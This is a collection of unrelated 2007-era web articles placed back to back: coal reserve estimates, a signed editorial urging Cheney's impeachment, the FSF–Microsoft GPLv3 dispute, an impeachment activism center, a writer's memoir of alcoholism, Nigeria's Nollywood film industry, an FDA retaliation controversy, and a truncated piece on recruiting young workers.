Dave Rutledge is an American researcher , based at the California Institute of Technology , who thinks that global coal reserves may be less than currently thought .
He starts his presentation with a discussion of oil production / depletion , moves on to coal reserves , climate change modelling and finishes with some alternative energy solutions .
Dave ’s research page contains a PowerPoint presentation , and roughly the same slides are in the video version which you can watch on YouTube .
As an example of a country that got its coal reserves wrong , Dave analyses what happened to the UK coal industry .
Dave states :
“ There is also a spreadsheet file there with the raw data and extra plots that do not fit in a presentation , together with a link to an archive webcast from a talk I gave at the University of California at San Diego on May 11 .
I was an undergraduate at Cambridge in the early 70's when the coal miners brought down the Heath government .
The critical part of this discussion is the British experience with coal , because it is the outstanding example of a country with major coal reserves that has gone through the complete rise and fall .
The American examples for Pennsylvania anthracite and Virginia are much smaller amounts of coal . ”
Dave sent ODAC a more up - to - date copy of his PowerPoint presentation Hubbert ’s Peak , The Question of Coal , and Climate Change ( 2.12 Mb ) .
This report has been summarized and discussed in some detail on The Oil Drum website : The Coal Question and Climate Change Dave Rutledge , The Oil Drum , 25 June 2007 .
If you have a spare hour , it is worth watching Dave 's video presentation .
5. US National Academy of Sciences
The US National Academy of Sciences have just released a report on coal , the fifth report in as many months suggesting global coal reserves may be considerably less than commonly believed .
Except that this report suggests taking up to 10 years to determine an accurate estimate of US coal reserves .
The report questions the myth of enough coal for 250 years , indeed , is certain there is enough coal only to 2030 , and that is at current rates of production .
The full report costs $ US36 - 42.30 , depending on version , but the crux of the report is available free , in the Report Brief ( PDF , 2.46 Mb , 4 pages ) .
All emphasis in bold is ODAC’s :
Accurate and comprehensive estimates of national coal reserves are essential for a coherent national energy strategy , particularly for community , workforce , and infrastructure planning .
Although the United States is endowed with a vast amount of coal , coal reserves ( i.e. , the coal that can be economically mined using current mining practices ) are a small proportion of total coal resources .
Present estimates of coal reserves — which take into account location , quality , recoverability , and transportation issues — are based upon methods that have not been updated since their inception in 1974 , and much of the input data were compiled in the early 1970s .
Recent programs to assess coal recoverability in limited areas using updated methods indicate that only a small fraction of previously estimated reserves are actually recoverable .
Such findings emphasize the need for a reinvigorated coal reserve assessment program using modern methods and technologies .
A coordinated federal - state - industry initiative to determine the magnitude and characteristics of the nation ’s recoverable coal reserves , using modern mapping , coal characterization , and database technologies , should be instituted with the goal of providing policy makers with a comprehensive accounting of national coal reserves within 10 years .
The report estimates that such an initiative , which should be lead by the U.S. Geological Survey and involve participation by the Energy Information Administration at DOE , states , and industry , will require additional funding of approximately $ 10 million per year .
To formulate national energy policies , federal policymakers need accurate estimates of the amount , location , and quality of mineable coal .
Such estimates are particularly important for community , workforce , and infrastructure planning .
It is clear that there is enough coal at current rates of production to meet anticipated needs through 2030 , and probably enough for 100 years , the committee said .
However , it is not possible to confirm the often - quoted assertion that there is a sufficient supply for the next 250 years .

August 2007 Issue
You do n’t have to dust for long before finding Dick Cheney ’s grimy fingerprints all over the Bush crime scene .
It ’s becoming clearer by the day that behind every one of Bush ’s illegal actions lurks the shadow of the Vice President .
Never in our history have we had a Vice President who grabbed so much power .
And never have we had a President so lazy that he was willing to divest so much power to such a man .
Cheney has said that it is his mission to aggrandize the Executive Branch .
And then he notoriously argued that he was not part of the Executive Branch , placing himself on a new twig all by his lonesome .
This is a man who has no respect for our system of checks and balances .
It is high time he was impeached .
Bush , too , should be impeached , for they are partners in crime .
But there is a certain logic in impeaching Cheney first .
After all , who would want to impeach Bush and be left with Cheney ?
And secondly , the path of criminality , time after time , leads back to Cheney .
It was Cheney , in the days after 9/11 , who insisted that the United States would have to work the “ dark side ” in the war on terror .
It was Cheney who devised many of the flimsy legal justifications for the torture that U.S. personnel committed .
“ The Vice President ’s office played a central role in shattering limits on coercion in U.S. custody , ” Barton Gellman and Jo Becker wrote in The Washington Post on June 25 .
They showed that the Vice President ’s lawyer , David Addington ( now his chief of staff ) , was instrumental in drafting the President ’s February 7 , 2002 , directive , which said that U.S. personnel would abide by the Geneva Conventions “ to the extent appropriate and consistent with military necessity . ”
Addington also worked on the Justice Department ’s infamous “ torture memo , ” which said that almost any infliction of cruelty that did n’t cause organ failure or death was justifiable .
Addington pressed the point that the President was exempt from treaties and laws governing torture , the Post said .
Those “ do not apply ” to the commander in chief , according to the torture memo .
It was Cheney who said he approved of the torture tactic of waterboarding , calling it “ a no -brainer . ”
It was Cheney , the Post said , who prevailed upon the Administration to declare U.S. citizens Jose Padilla and Yasser Hamdi enemy combatants and to deny them access to U.S. courts .
It was Cheney who insisted that detainees had no due process rights , here or abroad , and who bypassed normal channels — including the State Department and the National Security Council — to get Bush to sign off on this executive order , the Post reported .
It was Cheney who vigorously opposed any moves by Congress to outlaw torture , and got Congress to exempt the CIA from the ban .
It was Cheney who insisted that the Military Commissions Act , which Congress passed , include a section that lets the President decide whether something is a violation of the Geneva Conventions .
It was Cheney who initially advocated for detentions in secret CIA prisons around the globe , the Post reported , and who prevailed upon Bush to resume them .
Beyond championing the torture and detention policy , it was Cheney who first hyped the case for the Iraq War , beginning in the spring of 2002 .
It was Cheney who leaned all over the CIA in the lead - up to the Iraq War in an unprecedented interference with the intelligence agency ’s process of sifting through data .
As Seymour Hersh has reported for The New Yorker , Cheney cherry - picked and stove - piped any information that served to buttress his case .
And it was Cheney who , just days before Bush launched the war , went on Meet the Press and uttered the most flagrant lie , saying that Saddam Hussein had actually reconstituted nuclear weapons .
It was Cheney who directed the outing of Valerie Plame and the campaign to smear Joe Wilson .
“ There is a cloud over the Vice President , ” Special Prosecutor Patrick Fitzgerald told the jurors in the Scooter Libby trial .
And that cloud hangs even lower after Bush ’s shameful grant of clemency to Libby .
It was Cheney who pushed the illegal wiretapping that the NSA conducted on millions of Americans .
He sparred with Justice Department officials who did n’t want to go along with the spying at a White House meeting in March 2004 , according to the Senate testimony of former Deputy Attorney General James B. Comey .
That meeting took place just one day before then - White House Counsel Alberto Gonzales and then - Chief of Staff Andrew Card went to the hospital room of the ailing John Ashcroft and , in Godfather fashion , tried to get him to sign off on aspects of the NSA spying program .
Cheney later blocked the promotion of a Justice Department official who had expressed reservations about the NSA spying .
It was Cheney who exempted his office from the requirement to protect classified information , and who then tried to abolish the executive branch office that was complaining about his self - exemption .
It was also Cheney who was the prime mover behind Bush ’s signing statement spree .
“ The office of Vice President Dick Cheney routinely reviews pieces of legislation before they reach the President ’s desk , searching for provisions that Cheney believes would infringe on Presidential power , according to former White House and Justice Department officials , ” wrote Charlie Savage of the Boston Globe last May in a story that won a Pulitzer Prize .
“ The officials said Cheney ’s legal adviser and chief of staff , David Addington , is the Bush Administration ’s leading architect of the ‘ signing statements ’ the President has appended to more than 750 laws . ”
Two examples : Bush issued a signing statement on the anti-torture law to say that he would enforce it only to the extent that it did n’t interfere with his authority as commander in chief .
And he issued a signing statement on an obscure postal bill last fall to give the Executive Branch an expansive right to open first - class mail .
Dick Cheney is a man who has gone way over the line , time and time again .
He is fond of saying he has a constituency of one — Bush — when in fact we are all his constituents .
And as his constituents , we must avail ourselves of the only constitutional remedy at our disposal : impeachment .
Article 2 , Section 4 , specifically allows for the impeachment of the Vice President .
He clearly has committed “ high crimes and misdemeanors , ” which our founders construed to mean usurpations of power that subvert our system of checks and balances .
Cheney is a recidivist usurper .
We cannot keep letting him get away with his crimes .
Nor should we let Bush .
But OK , start with Cheney first .
Fortunately , Representative Dennis Kucinich has gotten the ball rolling .
This spring , he introduced House Resolution 333 , which calls for the impeachment of Cheney .
Kucinich ’s bill is co-sponsored by Representatives William Lacy Clay , Yvette Clarke , Keith Ellison , Barbara Lee , Jim McDermott , Jan Schakowsky , Maxine Waters , Lynn Woolsey , and Albert Wynn .
It is too narrow for my liking .
It contains only three articles .
The first two say that Cheney “ purposely manipulated the intelligence process to deceive citizens and Congress ” in the lead - up to the Iraq War , both about weapons of mass destruction and about the alleged link between Saddam Hussein and Al Qaeda .
The third one says Cheney “ has openly threatened aggression against the Republic of Iran absent any real threat to the United States . ”
Kucinich notes that such a threat is a violation of the U.N. Charter .
Cheney should be brought up on more charges than these .
But the concluding passage of the Kucinich bill is right on the mark :
“ Vice President Richard B. Cheney has acted in a manner contrary to his trust as Vice President , and subversive of constitutional government , to the prejudice of the cause of law and justice and the manifest injury of the United States .
Wherefore , Richard B. Cheney , by such conduct , warrants impeachment and trial , and removal from office . ”
Many people of goodwill raise objections to the idea of impeachment for either Cheney or Bush .
Let me attend to those .
But first , can we dispatch with the paternalistic claptrap that the American people somehow would n’t be able to endure another impeachment process ?
We are not so weak that we cannot stand up and fight for our constitutional system .
Some of the people who make this argument are the very ones who foisted upon the nation the ludicrous impeachment of Bill Clinton .
His petty , personal indiscretion , and even his serious lying under oath , pale in comparison to the crimes against the Republic that Bush and Cheney have been committing .
Still , some progressive allies say that impeachment will never pass .
It ’s a waste of time , so why try ?
Well , we do n’t know that .
Now that the Democrats have investigative powers , every time they turn over a new rock , more reptilian facts emerge .
And we may be headed toward a constitutional confrontation , as Bush and Cheney resist subpoenas from the House and Senate Judiciary Committees .
They are invoking “ executive privilege . ”
That has a certain ring to it , does n’t it ?
Patrick Leahy , head of the Senate Judiciary , called it “ Nixonian stonewalling ” and said , “ Increasingly , the President and the Vice President feel they are above the law . ”
John Conyers , head of the House Judiciary Committee , added : “ This is reckless .
It ’s a form of governmental lawlessness that is really astounding . ”
Conyers should know .
He sat on the Judiciary Committee when it voted to impeach Richard Nixon in 1974 .
And let ’s remember , one of the three articles that this committee brought forward concerned just such stonewalling .
Article 3 says : Richard M. Nixon “ failed without lawful cause or excuse to produce papers and things as directed by duly authorized subpoenas issued by the Committee on the Judiciary of the House of Representatives . . . and willfully disobeyed such subpoenas .
. . .
In refusing to produce these papers and things , Richard M. Nixon . . . acted in a manner contrary to his trust as President and subversive of constitutional government . ”
Incidentally , Conyers introduced in the last Congress a bill to explore grounds for impeachment , and that was before many of the Bush crimes surfaced .
He explained to Lewis Lapham of Harper ’s early last year that he was doing so because he did n’t want people to wonder , years from now , where everybody was and why nobody did anything when “ the Bush Administration declared the Constitution inoperative and revoked the license of parliamentary government . ”
Ironically , Conyers ’s party did not control the House at that time , so he knew his bill would go nowhere .
Now , with the Democrats in power , Con yers can move impeachment forward in the Judiciary Committee that he heads .
But he ’s gone uncharacteristically silent .
Why ?
Because House Speaker Nancy Pelosi has muzzled him .
She and other Democratic leaders say that impeachment may distract them from more important legislative duties .
But what could be more important than upholding the Constitution ?
And anyway , the argument does n’t hold up , since impeaching Cheney or Bush might be the best way to bring the war to an end and to restore some of our civil liberties .
That ’s what happened after Nixon resigned , as Kucinich adviser Steve Cobble has argued .
We got out of Vietnam , we had the Congressional hearings that exposed illegal spying and infiltration , and Gerald Ford ’s Attorney General , Edward Levi , issued guidelines prohibiting most domestic spying .
Partisan Democrats make one last argument against impeachment .
They say it will hurt their chances in 2008 of solidifying gains in Congress and in winning back the White House .
History , here , suggests otherwise .
In the Presidential election following the Nixon impeachment hearings , Jimmy Carter won .
And in the Presidential election following Clinton ’s impeachment , the Republicans won .
The pragmatic argument also collapses under its own light weight .
For impeachment is not about partisan payback or political gamesmanship .
It ’s about something much larger .
It ’s about whether we will have a democratic form of government or not .
Democrats and responsible Republicans alike need to rise to this challenge .
And what message does doing nothing send ?
It tells Bush and Cheney that they can get off scot - free .
And it leaves a loaded gun in the front drawer of the Oval Office desk for the next President to shoot more holes into the Constitution .
— Matthew Rothschild
“ Over the past six years , Cheney has shaped his times as no Vice President has before .
. . .
And he has found a ready patron in George W. Bush for edge - of - the - envelope views on executive supremacy that previous Presidents did not assert . ”
— Barton Gellman and Jo Becker of The Washington Post
“ In grasping and exercising Presidential powers , Cheney has dulled political accountability and concocted theories for evading the law and Constitution that would have embarrassed King George III . ”
— Bruce Fein , former Reagan Administration lawyer , writing in Slate
“ With the support of the leaders of the Progressive Caucus and the leader of the Out of Iraq Caucus , we will see more and more Members of Congress signing on in this effort to save our Constitution and protect the very values that bind us as a nation . ”
— Dennis Kucinich
In a statement issued today , the Free Software Foundation ( FSF ) has responded to Microsoft 's assertion that selling SUSE Linux support vouchers does n't make the company subject to the requirements of the new version of the General Public License ( GPL 3 ) .
The FSF has claimed in the past that Microsoft 's sale of SUSE Linux support vouchers — which is part of the company 's controversial agreement with Novell — constitutes conveyance of software , thus making Microsoft party to the license under which the software is distributed .
Microsoft disagrees with this interpretation and argues that conveyance of software does not occur because the vouchers are for support services rather than software .
Although Microsoft does not believe that a GPL license is required to sell support vouchers , the company decided to avoid the legal questions that could emerge from the debate by issuing a statement last month saying that the " Novell support certificates that we distribute to customers will not entitle the recipient to receive from Novell , or any other party , any subscription for support and updates relating to any code licensed under the GPLv3 . "
In a response issued today , the FSF argues that Microsoft would be bound to the terms of the GPL 3 if Microsoft causes conveyance of source code licensed under the GPL 3 .
Surprisingly , the statement does not say whether or not the FSF still thinks that Microsoft has actually caused code licensed under the GPL 3 to be conveyed .
" Microsoft cannot by any act of anticipatory repudiation divest itself of its obligation to respect others ' copyrights .
If Microsoft distributes our works licensed under GPLv3 , or pays others to distribute them on its behalf , it is bound to do so under the terms of that license .
It may not do so under any other terms ; it cannot declare itself exempt from the requirements of GPLv3 , " says the FSF .
" We will ensure — and , to the extent of our resources , assist other GPLv3 licensors in ensuring — that Microsoft respects our copyrights and complies with our licenses . "
The last line makes the statement sound like a legal threat , but that 's not entirely clear .
Note the use of the word " if " when the FSF describes the connection between distribution and GPL 3 obligations .
The FSF does n't say outright that Microsoft is party to the GPL 3 , they say that Microsoft could be party to the GPL 3 if the company distributes source code released under the license .
In the past , FSF representatives have said that Microsoft could eventually be party to the GPL 3 under a specific set of circumstances , but it appears as though Microsoft 's move to reject GPL 3 support for voucher recipients last month muddied the waters by ensuring that those circumstances could never transpire .
At this point , it seems unlikely that Microsoft is currently party to the GPL 3 or will become party to the GPL 3 as a result of the voucher program , but that 's still open to interpretation and probably will be until either an agreement is reached or it is addressed in court .
California activists inaugurate Impeachment Center on Independence Day Michael Roston

A group of progressive and Democratic activists in California will be using the July 4 holiday to inaugurate a nerve center that will work to bring more Congress members around to supporting the impeachment of President George W. Bush and Vice President Dick Cheney .
The Impeachment Center 's opening comes as one House Democrat took aim at House Speaker Nancy Pelosi 's statement that impeachment remained ' off the table . '
Wednesday afternoon in Los Angeles , members of local Green and Progressive Democratic party organizations will be joined by Rep. Maxine Waters ( D - CA ) to inaugurate an ' Impeachment Center . '
The Center will serve as " a [ Los Angeles ] countywide resource for advancing the impeachment of George W. Bush & Richard Cheney , " with " phonebanking , letterwriting and other Impeachment related resources available for distribution . "
The facility will be open on a weekly basis .
Matthew Gerbasi , the Impeachment Working Group Coordinator of the Progressive Democrats of America , described the Impeachment Center 's mission to RAW STORY on Tuesday .
" The center 's mission will be to get the LA City Council , and Santa Monica to pass pro-impeachment resolutions , and also to get all of the Congressional representatives in the Los Angeles - area to either sign on to Rep.
Dennis Kucinich's [ Cheney impeachment ] bill or to introduce Articles of Impeachment on their own , " the California - based activist said .
Gerbasi was n't sure that the funding existed to support similar resource center in any other locations in the country .
But he did n't rule out the possibility that progressive activists might devise similar strategies of their own .
" We do n't have nation - wide reach to make anyone do anything like this , but we 've been hearing about impeachment from a lot of Progressive Democrat chapters , " he told RAW STORY .
" A lot of chapter meetings turn into impeachment meetings after 15 or 20 minutes , and everyone there wants to impeach these guys , to hold them accountable , and they do n't feel that the House is doing their jobs . "
The launch of the Impeachment Center comes on the heels of the commutation of the sentence of convicted former White House aide I. Lewis " Scooter " Libby .
Rep. Jesse Jackson , Jr. ( D - IL ) is the latest
House member to contemplate impeachment , and has taken aim at one of his party 's top leader 's unwillingness to consider the possibility .
" I certainly hope Nancy Pelosi will withdraw her initial remarks that impeachment is completely off the table , " Jackson said , according to a Tuesday report from CBS News in Chicago .
However , it is not yet known if Jackson will become a co-sponsor of H. Res. 333 , the Articles of Impeachment for Cheney that Rep. Kucinich introduced in April .
To date , 12 House Democrats have signed on to the Ohio Democrat 's bill according to the website After Downing Street .

LIQUOR AND LIT
A Portrait of the Writer as a Drunk
by Charles Deemer
( originally published in Oregon Magazine )
Like many writers of my generation , I studied in the
school of liquor and lit .
Previous generations of
American writers pointed the way .
My literary heroes
when I was learning the craft in the 1960s were ( or
had been ) hard drinkers if not outright drunks :
O'Neill and Saroyan and Williams , Faulkner and
Steinbeck and Hemingway , Mailer and Baldwin and
Cheever , James Agee .
The hard - drinking American writer
was a figure of mythic proportions , and by the time I
graduated from UCLA I was eager to join his ranks .
But I came both to literature and to drinking
relatively late .
In high school I was one of those
science nerds who did n't date and got A's .
My idea of
a good time was to get up at three in the morning to
look through my telescope and fulfill my obligations
as one of the country 's younger members of the
American Association of Variable Star Observers .
It
took Uncle Sam to give me an appreciation for liquor
and lit .
I joined the Army at the end of a cycle of confusion ,
a major life crisis at 20 .
I went from high school to
Cal Tech as a math major , but none of my previous math
and science teachers had informed me that I was n't a
genius .
When I discovered the truth by sitting next to
an authentic genius or two at Cal Tech , I was crushed .
I wanted to be " a pure mathematician " more than
anything else ( the mathematician as artist ) , maybe an
astronomer next ; I learned that I did n't have the
brains to be a pure mathematician and that
professional astronomers rarely look through
telescopes .
I did n't want to become an engineer , but
this appeared to be my destiny if I stayed at Cal
Tech .
I left with a B average in the middle of my
sophomore year and transferred to Berkeley , telling
myself I was now a philosophy major .
Berkeley in 1959 was like the Internet in 1994 , full
of dazzling , chaotic energy .
I became a street person
in no time at all , finding the street life much more
exciting than classes , and for a while I even lived in
a tree house I 'd built in Strawberry Canyon .
I was
beginning to drink beer and wine regularly and , for
the first time , to read literary books that were n't
required in a class .
I ended up joining the Army because I was broke -- and
because the draft was hanging over my head .
An Oakland
recruiter decided I would make an excellent spy , and
so he put me in the Army Security Agency .
After doing
well on a battery of tests , I was assigned to the Army
Language School in Monterey , where I was trained as a
Russian linguist .
This proved to be a major turning
point in my life and a strong push toward a career in
liquor and lit .
Assigned to a company of Russian linguists in Germany ,
I found myself surrounded by former graduate students
with Masters degrees in Literaure and History and
Philosophy , majors that would not give them deferments
to escape the draft as they worked on their
doctorates .
They 'd joined the Army to avoid being a
foot soldier , and they became my tutors .
As one of
three odd - balls in the company who did n't have a
college degree , I became a sort of intellectual
mascot , and my colleagues fought among themselves to
influence me , one trying to turn me into an historian ,
another into a psychologist , still another into a
writer .
I was still drinking in the minor leagues at the time .
My fellow Russian linguists , most of them five years
older than I , inspired me to try out for the majors .
Shy by nature , but looking up to these older , bright
colleagues and wanting to join their drinking clique ,
I discovered a capacity to belt shot for shot with the
best of them , far into the night .
I may be younger and
less well - read , but they could n't drink me under the
table !
And so my Army career was highlighted by heavy
drinking and heavy reading in the most stimulating
intellectual environment of my life .
When I was discharged and returned to finish college ,
I majored in English at UCLA .
I was drinking regularly
by then , although I did n't really consider the one or
two six - packs I consumed daily to be " drinking . "
Drinking was consuming hard liquor , which usually I
reserved for weekends .
I was a student , after all ,
with books to read and papers to write .
Beer was what
you drank along the way because it tasted better than
water .
A six - pack a day did n't keep me from graduating
with honors , Phi Beta Kappa .
After UCLA , I went off to graduate school at the
University of Oregon , where more than ever liquor and
lit were the engines that drove my considerable
energy .
I was " someone to keep an eye on " in the
English Department , already publishing book reviews in
national journals and short stories in literary
magazines by the time I arrived .
Although my first
marriage had failed , I quickly met my second wife , a
brilliant graduate student who liked to brag that she
had never met a man who could drink her under the
table .
Then she met me , and it must have been love at
the seventh or eighth pitcher .
Everyone , or at least everyone worth knowing , was
hanging out at Maxie 's tavern near campus , and when it
closed many would come over to our house for
nightcaps .
Literary talk was loud and heated , at least
until the guitars and auto harp came out , and a few of
us sang folk music as others passed around joints and
mellowed out .
My generation was too young to be
beatniks and too old to be hippies but we prided
ourselves on being academic bohemians all the same ,
seasoned students in the school of liquor and lit .
When I graduated with an MFA in Playwriting in 1974 , I
had a growing list of publications , the first awards
and productions of a playwriting career , and a thirst
for alcohol more insatiable than ever .
But something
was beginning to change .
The dark side of alcohol
consumption was beginning to reveal itself .
I do n't have to tell you what happened next .
You
already know .
Alcohol is our culture 's official , legal
drug , and everyone knows someone who has abused it .
What happened to me over the next twenty years is more
or less what happens to every alcoholic .
The Japanese
have put the progression of the drinking life more
succinctly than anyone : first the man takes the drink ;
then the drink takes the drink ; then the drink takes
the man .
But why did n't I know about the dark side of liquor
and lit when I bought into the curriculum ?
What was so
attractive about the hard - drinking literary life in
the first place ?
Why were so many writers of my
generation ( and earlier ones ) such big boozers ?
I first began to look closely at these questions
during the year I spent as an in - patient in a VA
treatment program .
Assigned to work in the medical
library , I had a lot of time on my hands and read as
much as I could about alcoholism .
I found two books
about the curious marriage of writing and alcohol
abuse in American culture and I devoured each , looking
for answers .
In " The Thirsty Muse : Alcohol and the American Writer "
( 1989 ) , Tom Dardis begins with fascinating statistics :
" Of the seven native - born Americans awarded the Nobel
Prize in literature , five were alcoholic .
The list of
other twentieth - century American writers similarly
affected is very long ; only a few of the major
creative talents have been spared . "
Dardis points out that similar statistics do not hold
true for European writers , suggesting the affiliation
between writers and booze is a particularly American
phenomenon ( and perhaps one that happened at a certain
time as well ) .
So what 's the explanation ?
Dardis makes no real
attempt to find out .
Instead he gives us detailed
chapters on the sordid drinking lives of Faulkner ,
Fitzgerald , Hemingway and O'Neill , telling horror
stories similar to those one can hear in any AA
meeting anywhere in the land .
Dardis concludes : " All four of the writers discussed
here suffered tremendous physical and spiritual pain
through their heavy drinking .
Three of them found
their creativity irreparably demaged by their
alcoholism ; only one escaped from the grip of the
disease to discover that its very nature would become
his greatest subject . "
The latter is O'Neill , of
course , who sobered up and went on to write his two
masterpieces , " Long Day's Journey Into Night " and " The
Iceman Cometh . "
Donald W. Goodwin is much more helpful in " Alcohol and
the Writer " ( 1988 ) .
Although he , too , explores the
drinking lives of a number of writers -- Poe ,
Fitzgerald , Hemingway , Steinbeck , Simenon , Faulkner ,
O'Neill , Lowry -- he boldly attempts to explain why
such " an epidemic " happened in America in the
twentieth century .
His chapter " Notes on an Epidemic "
even has a subchapter entitled " Causes . "
Goodwin lists three reasons why alcohol and the writer
go so well together .
I 'll relate each to my own
experience .
" 1 . The hours are good . "
No doubt about it , the
writing life ( especially on a freelance basis )
provides considerable time for drinking .
Most of my
life I 've written to deadlines , paid by the project ,
which gave me lots of wiggle room for fitting in a
binge or two .
I 'd get an assignment or a grant and not
expect to be seen for weeks at a time .
No one cared if
I wrote at three in the morning or three in the
afternoon .
All that mattered was that I deliver the
product by the deadline .
And , to use alcoholic
double - speak , I never missed a deadline I did n't get
extended .
" 2 . It is expected . "
I 've already confessed to buying
into the myth of the hard - drinking American writer .
All my heroes drank heavily , so why should n't I ? I
think the association between writing and drinking has
changed in our culture -- or maybe just been
transferred .
Perhaps in the sixties the hard - drinking
writer became the hard - drugging rock star .
Same myth ,
different characters .
I look around today and find
more coffee shops than bars ; maybe that 's where young
writers meet .
I hope so .
" 3. Writers need inspiration . "
I do n't buy this one .
Alcohol never inspired me .
I could n't write drunk and
did n't even try .
I wrote with a hangover , of course ,
but whatever " inspiration " may have come to me while
drinking I forgot by morning , and I always wrote in
the morning as soon as I could function .
I 'm one of
those writers who believe in perspiration more than
inspiration .
But writers as distant as Fitzgerald and
Stephen King are quoted by Goodwin in support of
alcohol 's ability to enhance creativity .
Not with this
kid .
Goodwin next has a subchapter heading called " The
Loner Theory . "
He quotes an interpretation by
historian Gilman Ostrander :
" Alcoholism is basically a disease of individualism .
It afflicts people who from early childhood develop a
strong sense of being psychologically alone and on
their own in the world .
This solitary outlook prevents
them from gaining emotional release through
associations with other people , but they find they can
get this emotional release by drinking .
So they become
dependent on alcohol in the way other people are
dependent on their social relationships with friends
and relatives . "
I almost fell out of my chair when I read this .
This
described my life to the letter .
A Navy brat raised
primarily by my mother , I became good at math because
I learned arithmetic as early as I learned to talk .
Mother took me everywhere and kept me quiet by giving
me pages of arithmetic problems to do , which I
obediently and quietly solved .
In my teens I was
obsessed with using my telescope , a solitary activity
that usually happened at hours when everyone around me
was asleep .
Shy by nature , I became gregarious only
when under the influence of alcohol ( also part of the
loner theory ) , and the barroom became the center of my
social universe .
Goodwin goes on to argue that writing and alcohol
share something important :
" Writing and alcohol both produce trancelike states .
A
gift for creative writing may involve an innate
ability to enter trancelike states .
Being a loner --
shy , isolated , without strong personal ties -- may
facilitate trancelike states when it is time to write
and encourage drinking to overcome the shyness and
isolation when it is time to relax . "
This described my
working - drinking rhythm perfectly .
The loner theory , more than anything else I 've found ,
best explains to me why I was attracted to the
drinking life and why drinking fit so well with the
writing life .
Maybe this does n't describe the
experience of other writers .
I 'm not making a
universal claim for this theory ( as Goodwin does ) , but
it describes my own experience as a hard - drinking
writer very well .
A former hard - drinking writer , I must add .
Today I
hold up the model of Eugene O'Neill , who quit in time
to do his best work later in life .
I hope I have the
same luxury .
I consumed my last alcoholic beverages on June 13 ,
1993 , at Jazz de Opus in Portland .
I went there on the
night before I entered treatment at the VA .
I went
there with a credit card and a plan .
I sat at a table near the bar and spent the next
several hours saying goodbye to some old campanions .
I
began with a glass of Guinness .
I next had a light
beer with a shot of Jameson 's Irish on the side .
I
added a double shot of Stolichnaya on the rocks before
the beer was gone .
I switched to a house Gin and
Tonic , a breather .
Then I ordered a Bombay Blue
Saphhire martini , which tasted so good I had another .
Maybe the waitress thought I 'd finally made up my mind
because I stayed with the Blue gin until I was ready
to go home .
For a nightcap , I ordered a special drink for old
times , a farewell toast to a way of life , a moment I
expected to remember forever -- and have .
I ordered a
B - 52 .
Its layers reminded me of the different
periods of my life -- the high school science nerd ,
the confused mathematician , the Berkeley street
person , the linguist - spy - mascot , the ambitious grad
student , the less ambitious playwright -- each period
clearly set apart from the others .
When I raised the
small , narrow glass and tipped it , the fragile
spectrum dissolved as each color ran into its neighbor
to become a drab concoction of spirits , suddenly dark
and dreary , just as the periods of my life finally had
succumbed to one all - encompassing description , which
had become more meaningful than any colorful
distinctions between them : I was living the life of a
drunk .
I belted down the B - 52 , paid my
considerable tab , and left .
One B - 52 pilot on one final mission .
Over and out .
( But somehow I lived to tell the tale . )

Armed with a few thousand dollars , digital cameras and some lights , Nigerian directors have created a $ 250 million industry .
Photo : Aimee Corrigan
The Nigerian film industry is the third largest in the world , after Hollywood and Bollywood .
Outside its native continent , the industry affectionately known as Nollywood remains relatively unknown .
Yet millions of African fans can't get enough of its movies .
Unlike their international counterparts , the films coming out of Nollywood are n't intended for the big screen .
Nigerian filmmakers use a mix of quick - and - dirty digital technology , shooting their movies entirely on digital video , editing them on home computers and delivering them to the market on VHS , DVD and video compact discs , or VCDs .
Two films , slated for screenings and release on DVD this summer , shed light on the flourishing industry .
This Is Nollywood , directed by Franco Sacchi and Robert Caputo , follows Nigerian director Bond Emeruwa as he produces a feature - length action movie , Check Point , in just nine days on a budget of only $ 20,000 , an allotment most American directors would deem incomprehensible .
Welcome to Nollywood , a documentary by Jamie Meltzer , film professor at Vassar College , follows three of the hottest Nigerian directors as they race to complete films on shoestring budgets in a matter of weeks .
Both films provide a behind - the - scenes look at these sometimes seat - of - the - pants enterprises .
During one scene of Welcome to Nollywood , top action - director Izu Ojukwu recalls his introduction to the movie business : Building a movie projector from scratch to host screenings in his village .
" There 's an independent streak and a real pride in Nollywood , of getting across national identity and culture , " says Meltzer .
" Regardless of whether or not we pay attention , they 're still going to make films . "
Since its inception in the 1990s , the burgeoning Nigerian movie scene has bloomed into a $ 286 million business annually , despite the fact that films have minimal budgets ( ranging from $ 10,000 to $ 25,000 ) and sell for just a few dollars apiece .
What this industry does have is volume , with some 300 directors churning out an average of 2400 films annually .
Most of the movies are in English , allowing for the widest possible crossover appeal in the multi-lingual Nigerian market .
This lightning - quick turnaround also allows directors and producers to make films with plotlines that reflect the rapidly changing political and cultural climate , often weaving in aspects of current events .
Whether revolving around corruption , prostitution , folkloric legends , HIV / AIDS , cautionary tales , romantic comedies or even epic period pieces about slavery and civil wars , the films present an unfiltered view of African culture , intended for an African audience .
As Peace Anyiam - Fiberesima , founder of the Africa Movie Academy Awards , puts it in This Is Nollywood , " It 's not about quality at the moment . …
Africa still has people living on $ 1 a day , and these are the people that really watch these films . "
This Is Nollywood comes out on DVD next month .
Welcome to Nollywood will be shown at the Melbourne International Film Fest in Australia at the end of July , followed by a showing August 25 in Fort Green Park in Brooklyn , New York , as a summer movie screening and the Mill Valley Film Fest this October in California .

After four FDA food safety experts told Congressional investigators that the agency 's inspection capabilities ranged from mediocre to terrible , agency water - carrier Margaret Glavin issued a not - so - veiled rebuke that may have violated federal law .
Slate has a detailed blow - by - blow of the affair .
In an email sent to employees in her division , Glavin – the associate commissioner for regulatory affairs – said :
I am deeply sadened by this assessment because I know that it is not an accurate reflection of ORA 's performance ....
I know that many of you were also disappointed , and perhaps even angry , at this erroneous statement .
House energy and oversight subcommittee leaders John Dingell
( D- Michigan ) and Bart Stupak ( D - Michigan ) were n't impressed .
In a letter to FDA chief Andrew von Eschenbach , they wrote :
Ms. Glavin 's central message appears to be that dissent within the ranks will not be tolerated .
This is tantamount to retaliation for her employees ' sworn testimony to congress .
As such , it is a clear violation of your policy to protect the right of FDA
employees to express dissenting opinions to Congress ....
Moreover , her actions may violate federal law prohibiting anyone from interfering with the right of a Federal employee to provide information to Congress .
The question , now , is what you , as FDA Commissioner , are going to do ....
Talk about throwing down the glove .
Stay tuned , and for more general details about the hearings and the FDA 's ( temporarily suspended ) plans to improve inspections by shutting down labs , read our earlier coverage .

Apologies for the weird watercolor effect – the FDA does n't even have Glavin 's picture , and the only one I could find was a thumbnail so tiny that even Noise Ninja could n't save it .

Companies are having a hard time recruiting and retaining young talent , and as a result are accommodating what would have once been considered extreme demands .
“ The scales have tipped in favor of knowledge workers , creating a seller ’s market for the next 5 to 10 years , ” writes to Stan Smith , National Director of Next Generation Initiatives at Deloitte .
Here are some reasons why so many younger workers have gained the advantage when it comes to negotiating the terms of a new job .
The workforce is shrinking .
